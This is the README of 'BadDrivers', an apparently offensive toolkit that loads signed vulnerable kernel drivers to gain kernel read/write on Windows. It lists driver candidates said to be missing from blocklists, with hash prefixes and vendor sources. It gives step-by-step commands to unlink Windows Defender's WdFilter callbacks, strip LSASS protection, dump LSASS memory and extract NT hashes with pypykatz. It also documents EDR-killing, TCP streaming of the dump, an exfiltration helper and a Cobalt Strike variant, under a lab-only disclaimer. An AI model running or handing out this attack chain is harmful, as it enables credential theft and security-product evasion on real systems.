# BadDrivers — BYOVD Research Toolkit

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

Kernel-mode LSASS credential extraction via **Bring Your Own Vulnerable Driver** (BYOVD).
Lab-only research tool. Isolated environment. No external targets.

> **⚠️ DISCLAIMER:** This tool is for authorized security research, penetration testing, and educational purposes only. Use only in isolated lab environments with explicit authorization. Misuse may violate computer fraud laws.

---

## Overview

`cascade.exe` is a consolidated BYOVD tool that:

1. **Loads** a legitimate, signed vulnerable kernel driver
2. **Exploits** the driver's IOCTLs for arbitrary kernel read/write
3. **Patches** WdFilter out of the ObCallback chain (EDR bypass)
4. **Dumps** LSASS memory via ReadProcessMemory (not MiniDumpWriteDump)
5. **Outputs** raw binary convertible to MiniDump for credential extraction

**Proven result (Win11 22H2 + WdFilter):**
- 515 memory regions, 48.3 MB dump
- 81 PE modules reconstructed
- NT hash confirmed via pypykatz

---

## Supported Drivers (`--driver-type`)

| Type | Driver | Gate | loldrivers | Status |
|------|--------|------|------------|--------|
| `biostool` | BiosToolCommonDriver.sys | None | Yes | **CONFIRMED** |
| `rtsppx` | RtsPpx.sys | None | **NO** | **CONFIRMED (NOVEL)** |
| `rwdrv` | RwDrv.sys | None | Novel hash | Ready to test |
| `iocdrv` | iOCdrv.sys | None | Yes | Has whitelist |
| `asio3` | AsIO3_64.sys | SWWL magic | Yes | Requires bypass |
| `ktapi` | ktapi.sys | None | — | — |
| `pdfwkrnl` | PdFwKrnl.sys | None | — | Legacy |
| `asmio` | AsmIo.sys | None | Yes | — |
| `ntiolib` | NTIOLib.sys | Magic auth | Yes | Address whitelist |

### Novel Drivers (NOT on loldrivers.io)

| Driver | Hash (first 8) | Signer | Status |
|--------|----------------|--------|--------|
| **RtsPpx.sys** | `0259226b` | Realtek (DigiCert) | **CONFIRMED** |
| **RwDrv.sys** | `6c32b33f` | lab-z (DigiCert) | Backend ready |
| **RMDRVSYS.sys** | `b24f0d3d` | ADLINK (DigiCert) | Needs RE |

See [`docs/NOVEL-DRIVER-CANDIDATES.md`](docs/NOVEL-DRIVER-CANDIDATES.md) for full analysis.

---

## Requirements

- Windows 10/11 x64 (tested on Win11 22H2, build 22621)
- Administrator privileges with `SeLoadDriverPrivilege`
- HVCI disabled
- Credential Guard disabled
- Driver `.sys` file (see [Driver Acquisition](#driver-acquisition))

---

## Quick Start

### 1. Build (macOS/Linux cross-compile)

```bash
# Requires: brew install mingw-w64
./scripts/build.sh
```

Output: `build/Release/cascade.exe` + `libwinpthread-1.dll`

### 2. Safety Check

```cmd
cascade.exe --check-security
```

Both `HVCI: DISABLED` and `Credential Guard: DISABLED` must show.

### 3. Test Kernel R/W

```cmd
cascade.exe --driver BiosToolCommonDriver.sys --test-rw
```

### 4. Full Chain

```cmd
REM Patch WdFilter ObCallbacks
cascade.exe --driver BiosToolCommonDriver.sys --patch-callbacks --no-xor

REM Dump LSASS via ReadProcessMemory
cascade.exe --driver BiosToolCommonDriver.sys --dump-rpm --out heap.bin --no-xor
```

```bash
# Convert and extract (on analyst box)
python3 tools/rpm2minidump.py heap.bin lsass.dmp
pypykatz lsa minidump lsass.dmp
```

Or use the automated chain: `tools/run_chain.ps1`

---

## Driver Acquisition

The `.sys` files are **not bundled** in this repo (driver binaries in git = fingerprinted SHA).

Acquire from vendor installers:
- **BiosToolCommonDriver.sys** — Phoenix BIOS utility installer
- **RtsPpx.sys** — Realtek PCIe card reader driver package
- **iOCdrv.sys** — Intel Extreme Tuning Utility (XTU)
- **AsIO3_64.sys** — ASUS AI Suite / Armory Crate

---

## Repository Structure

```
BadDrivers/
├── src/                          # Core source code
│   ├── cascade.cpp               #   Primary BYOVD tool (all backends)
│   ├── warp.cpp                  #   Legacy PdFwKrnl-specific tool
│   └── byovd_dump_bof.c          #   Cobalt Strike BOF variant
│
├── samples/                      # Archival reference implementations
│   ├── byovd_sample2.cpp         #   Minimal PPL strip demo
│   └── dump_the_goodz_7.cpp      #   Classic MiniDumpWriteDump + XOR
│
├── tools/                        # Operational & post-processing
│   ├── rpm2minidump.py           #   Raw dump -> MiniDump converter
│   ├── run_chain.ps1             #   Full attack chain automation
│   ├── exfil.ps1                 #   TCP exfiltration helper
│   └── build_bof.sh              #   BOF cross-compilation
│
├── scripts/                      # Build automation
│   └── build.sh                  #   MinGW cross-compile script
│
├── tests/                        # Test suites
│   ├── cascade_e2e.py            #   28-check E2E via Proxmox VM
│   └── run_suite.py              #   Test runner
│
├── deploy/                       # Target deployment & pre-flight
│   ├── probe.ps1                 #   Pre-flight HVCI/CG/Defender check
│   └── enable-ssh.ps1            #   One-time VM SSH setup
│
├── docs/                         # Research documentation
│   ├── BYOVD-DRIVER-MATRIX.md    #   Consolidated test results
│   ├── MANUAL-TESTING.md         #   Manual testing procedures
│   ├── NOVEL-DRIVER-CANDIDATES.md#   Novel driver discovery notes
│   ├── RtsPpx-RE-ANALYSIS.md     #   RtsPpx reverse engineering
│   ├── RMDRVSYS-RE-ANALYSIS.md   #   RMDRVSYS reverse engineering
│   └── NTIOLib-RE-ANALYSIS.md    #   NTIOLib reverse engineering
│
├── infra/                        # Lab VM infrastructure
│   ├── README.md                 #   VM setup guide
│   ├── pve.sh                    #   Proxmox API helper
│   ├── vm.sh                     #   VMware Fusion helper
│   ├── vm_mcp_server.py          #   MCP server for Claude VM ops
│   ├── win11-lab.vmx             #   VMware VM config template
│   └── qemu/                     #   QEMU/KVM lab setup
│       ├── run.sh                #     QEMU launch script
│       ├── autounattend.xml      #     Unattended Windows install
│       └── make-autounattend-iso.sh
│
├── build/Release/                # Build output (gitignored except BOF .o)
├── .gitignore
├── LICENSE
├── CMakeLists.txt
├── AGENTS.md                     # AI agent context
└── README.md
```

---

## Attack Chain

```
1. Load Driver          sc create + sc start (SeLoadDriverPrivilege)
2. Kernel R/W           --test-rw (verify primitive via IOCTL)
3. Patch ObCallbacks    --patch-callbacks (unlink WdFilter)
4. Strip LSASS PPL      --ppl-strip --pid <lsass_pid>
5. Dump LSASS           --dump-rpm (ReadProcessMemory, not MiniDump API)
6. Extract Creds        rpm2minidump.py + pypykatz lsa minidump
```

---

## CLI Reference

| Flag | Description |
|------|-------------|
| `--driver <path>` | Path to vulnerable `.sys` file |
| `--driver-type <type>` | Driver backend (see table above) |
| `--check-security` | Check HVCI / Credential Guard status |
| `--test-rw` | Test kernel read/write primitive |
| `--patch-callbacks` | Unlink WdFilter from ObCallback chain |
| `--list-callbacks` | List registered ObCallbacks |
| `--ppl-strip --pid <N>` | Zero Protection byte in EPROCESS |
| `--dump-rpm` | Dump LSASS via ReadProcessMemory |
| `--dump-kernel` | Dump via kernel-mode read |
| `--dump-tcp <ip:port>` | Stream dump over TCP |
| `--kill-edr` | Terminate EDR process |
| `--list-procs` | List processes with protection levels |
| `--out <path>` | Output file path |
| `--no-xor` | Skip XOR encoding on output |
| `--dry-run` | Parse args only, no driver interaction |
| `--verbose` | Verbose output |

---

## Testing

### Automated (via Proxmox VM)

```bash
# Configure via env vars (see tests/cascade_e2e.py header)
export BADDRIVERS_PVE="root@proxmox-host"
export BADDRIVERS_VMID="125"

python3 tests/cascade_e2e.py
# Runs 28 feature checks
```

### Manual

See [`docs/MANUAL-TESTING.md`](docs/MANUAL-TESTING.md) for step-by-step procedures.

### Pre-flight Probe

```powershell
# On the target VM (checks VBS/HVCI/CG/Defender state)
powershell -ep bypass -f deploy/probe.ps1
```

---

## Lab VM Setup

See [`infra/README.md`](infra/README.md) for:
- Windows 11 22H2 x64 VM creation (VMware Fusion / QEMU)
- Post-install hardening disable (HVCI, CG, PPL, Defender)
- SSH setup and snapshot workflow

---

## Documentation

| Document | Description |
|----------|-------------|
| [`docs/BYOVD-DRIVER-MATRIX.md`](docs/BYOVD-DRIVER-MATRIX.md) | Consolidated test results across all drivers |
| [`docs/NOVEL-DRIVER-CANDIDATES.md`](docs/NOVEL-DRIVER-CANDIDATES.md) | Novel drivers not on loldrivers.io |
| [`docs/RtsPpx-RE-ANALYSIS.md`](docs/RtsPpx-RE-ANALYSIS.md) | RtsPpx.sys full RE (confirmed novel) |
| [`docs/RMDRVSYS-RE-ANALYSIS.md`](docs/RMDRVSYS-RE-ANALYSIS.md) | RMDRVSYS.sys preliminary RE |
| [`docs/NTIOLib-RE-ANALYSIS.md`](docs/NTIOLib-RE-ANALYSIS.md) | NTIOLib.sys RE (address whitelist — rejected) |

---

## License

[MIT](LICENSE) — See [DISCLAIMER](#badDrivers--byovd-research-toolkit) above.
